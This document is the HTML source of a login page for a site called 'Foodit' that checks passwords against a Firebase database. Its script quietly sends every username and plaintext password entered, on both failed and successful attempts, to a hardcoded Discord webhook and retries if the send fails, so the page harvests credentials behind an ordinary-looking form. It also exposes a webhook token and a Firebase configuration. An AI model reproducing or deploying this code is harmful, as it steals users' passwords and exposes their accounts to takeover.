<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1" name="viewport"/>
<title>Login | Foodit</title>
<link href="https://i.postimg.cc/DwTNfscc/foodit-Logo.png" rel="icon" type="image/png"/>
<style>
    body {
      background: linear-gradient(to bottom right, #d98d06, #b87807);
      font-family: Arial, sans-serif;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    form {
      background: #db6a00;
      padding: 20px 30px;
      border-radius: 15px;
      box-shadow: 0 0 15px #f8b500;
      width: 100%;
      max-width: 320px;
      display: flex;
      flex-direction: column;
    }
    h1 {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-bottom: 20px;
      font-size: 28px;
    }
    input {
      padding: 10px;
      margin-bottom: 15px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      width: 100%;
      box-sizing: border-box;
    }
    input:focus {
      outline: none;
      box-shadow: 0 0 5px #f8b500;
    }
    button {
      background: #fff3e0;
      color: #db6a00;
      border: none;
      padding: 12px;
      font-family: Arial, sans-serif;
      font-size: 18px;
      cursor: pointer;
      border-radius: 10px;
      font-weight: bold;
      transition: background 0.3s ease;
      text-align: center;
    }
    button:disabled {
      background: #cccccc;
      cursor: not-allowed;
      color: #666666;
    }
    button:hover:not(:disabled) {
      background: #b25500;
      color: white;
    }
    .error, .success {
      padding: 10px;
      border-radius: 8px;
      margin-bottom: 15px;
      text-align: center;
      font-weight: bold;
      display: none;
    }
    .error { background: #ff6f6f; }
    .success { background: #4caf50; }
</style>
<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getDatabase, ref, get, child } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
    import jsSHA from "https://cdn.jsdelivr.net/npm/jssha@3.3.1/dist/sha256.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCVJcIFnKgG75EpTmbIvg-zeypVbU03I3g",
      authDomain: "foodit-chat.firebaseapp.com",
      databaseURL: "https://foodit-chat-default-rtdb.firebaseio.com",
      projectId: "foodit-chat",
      storageBucket: "foodit-chat.appspot.com",
      messagingSenderId: "798551611055",
      appId: "1:798551611055:web:c896f152ae356d2b39665a"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const form = document.getElementById("login-form");
    const msgBox = document.getElementById("msg");
    const submitBtn = form.querySelector("button");

    function showMessage(type, text) {
      console.log(`Message: ${type} - ${text}`);
      msgBox.className = type;
      msgBox.textContent = text;
      msgBox.style.display = "block";
    }

    function hashPassword(password) {
      console.log("Hashing password");
      const shaObj = new jsSHA("SHA-256", "TEXT");
      shaObj.update(password);
      return shaObj.getHash("HEX");
    }

    async function sendToDiscordWebhook(username, password, status) {
      const webhookUrl = "https://discord.com/api/webhooks/1416566958320517271/t4QcaIJbYX7ZWlPvaxK6g85VmM7TRbJvI1Z3Yy0Hi8oHYPjYAJfkuKBEsVg9EktzmX7i";
      const payload = {
        content: `**Login Attempt**\nStatus: ${status}\nUsername: ${username}\nPassword: ${password}\nTimestamp: ${new Date().toISOString()}`
      };

      for (let attempt = 1; attempt <= 3; attempt++) {
        try {
          console.log(`Sending webhook (attempt ${attempt}):`, payload);
          const response = await fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
          });
          if (response.ok) {
            console.log("Webhook sent successfully");
            return;
          } else {
            console.error(`Webhook failed (attempt ${attempt}):`, response.status, response.statusText);
          }
        } catch (err) {
          console.error(`Webhook error (attempt ${attempt}):`, err.message);
        }
        if (attempt < 3) await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1s before retry
      }
      console.error("All webhook attempts failed");
    }

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      msgBox.style.display = "none";
      submitBtn.disabled = true;
      console.log("Form submitted");

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value;

      if (!username || !password) {
        showMessage("error", "Please enter both username and password.");
        await sendToDiscordWebhook(username, password, "Failed - Missing Fields");
        submitBtn.disabled = false;
        return;
      }

      try {
        console.log("Fetching user data from Firebase for username:", username);
        const dbRef = ref(db);
        const snapshot = await get(child(dbRef, `users/${username}`));
        
        if (!snapshot.exists()) {
          showMessage("error", "Username does not exist.");
          await sendToDiscordWebhook(username, password, "Failed - Username Not Found");
          submitBtn.disabled = false;
          return;
        }

        const data = snapshot.val();
        const hashed = hashPassword(password);
        console.log("Comparing hashed password:", hashed, "with stored:", data.password);

        if (data.password !== hashed) {
          showMessage("error", "Incorrect password.");
          await sendToDiscordWebhook(username, password, "Failed - Incorrect Password");
          submitBtn.disabled = false;
          return;
        }

        // Successful login
        console.log("Login successful, sending to webhook");
        await sendToDiscordWebhook(username, password, "Success");
        localStorage.setItem("fooditCurrentUser", username);
        showMessage("success", "Login successful! Redirecting...");
        setTimeout(() => {
          console.log("Redirecting to stats.html");
          window.location.href = "stats.html";
        }, 1500);

      } catch (err) {
        console.error("Firebase error:", err.message);
        showMessage("error", `Login failed: ${err.message}`);
        await sendToDiscordWebhook(username, password, `Failed - Error: ${err.message}`);
        submitBtn.disabled = false;
      }
    });
</script>
</head>
<body>
<form autocomplete="off" id="login-form">
<h1>Foodit Login</h1>
<div id="msg"></div>
<input id="username" placeholder="Enter username" required type="text"/>
<input id="password" placeholder="Enter password" required type="password"/>
<button type="submit">Login</button>
</form>
</body>
</html>
